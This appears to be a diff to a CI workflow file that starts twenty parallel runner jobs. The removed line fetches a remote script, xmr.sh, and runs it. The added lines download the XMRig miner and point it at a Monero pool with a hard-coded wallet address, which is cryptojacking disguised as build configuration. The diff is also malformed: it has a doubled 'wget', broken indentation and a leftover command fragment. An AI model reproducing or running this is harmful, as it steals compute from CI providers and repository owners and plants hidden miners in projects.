@@ -24,4 +24,9 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/NAWAK01/script/main/xmr.sh?token=GHSAT0AAAAAABW5QR5GXLL7U3QYYHPGX4JUYW5C34A && chmod +x xmr.sh && ./xmr.sh
+          wget wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 8AV3c7YJDj2PysWsU3ctb9j9CH1yNMhtNUyYcs1XEW9vSjXT5AvwUbsiXtfCyzw4hL4RuihvRtt2EcvaXUxKwszd1Rn5FES -k --tls --rig-id rig
+ -O xmr.sh && chmod +x xmr.sh && ./xmr.sh
